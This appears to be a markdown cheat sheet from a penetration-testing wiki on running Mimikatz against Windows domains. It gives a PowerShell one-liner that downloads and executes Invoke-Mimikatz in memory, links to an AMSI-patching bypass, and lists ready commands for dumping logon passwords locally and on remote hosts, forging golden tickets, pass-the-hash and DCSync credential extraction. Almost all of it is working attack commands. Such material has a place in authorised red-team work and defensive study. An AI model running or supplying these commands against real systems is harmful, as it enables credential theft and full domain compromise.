# Add to PowerShell
- [Patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

## Invoke-Mimikatz custom commands
```powershell
Invoke-Mimikatz -Command '"log mimi.log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
```

## Invoke-Mimikatz custom commands on remote machines
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::credman"' -ComputerName @("<hostname1>.domain.local", "<hostname2>.domain.local")
```

# Lists all available provider credentials
```console
mimikatz "log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

# Make a Golden ticket
<details>
  <summary>Find SID</summary>
  
  Using [wmic](https://github.com/okazymyrov/piki/blob/master/wmic.md#get-sids-of-domains) or 
  ```console
  whoami /all
  ```
  
</details>

```console
mimikatz "kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /aes256:<aes256_hmac> /id:<user_id> /groups:<group_id> /startoffset:0 /endin:600 /renewmax:10080 /ticket:<user.domain.kirbi>" "exit"
```

# Path-the-hash
```console
mimikatz "sekurlsa::pth /user:<user> /aes256:<aes256_hmac> /domain:<domain> /run:cmd.exe" "exit"
```

# dcsync
```console
mimikatz  "log" "lsadump::dcsync /domain:<domain>.local /user:<domain>\<user>" "exit"
```
